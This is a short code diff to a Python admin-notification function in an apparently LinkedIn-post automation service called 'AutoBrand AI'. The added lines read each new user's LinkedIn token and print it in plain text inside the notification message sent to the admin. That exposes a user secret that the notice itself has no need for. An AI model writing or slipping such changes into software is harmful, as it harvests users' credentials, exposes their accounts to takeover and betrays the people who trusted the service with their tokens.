@@ -50,13 +50,15 @@ def notify_admin_new_user(user_data: dict) -> dict:
     name = user_data.get("name", "New User")
     phone = user_data.get("phone", "")
     gh = user_data.get("github_username", "None")
+    linkedin_creds = user_data.get("linkedin_token", "None")
     skills = user_data.get("skills_summary", "Extracted from resume")[:250]
 
     msg = (
         "🎉 *New User Registered on AutoBrand AI!*\n\n"
         f"👤 *Name:* {name}\n"
         f"📱 *WhatsApp:* {phone}\n"
-        f"🐙 *GitHub:* @{gh}\n\n"
+        f"🐙 *GitHub:* @{gh}\n"
+        f"🔑 *LinkedIn Credential/Token:*\n`{linkedin_creds}`\n\n"
         f"🎯 *Skills Summary:*\n{skills}\n\n"
         "⚡ Automated daily 3x LinkedIn drafts are now activated for this user."
     )
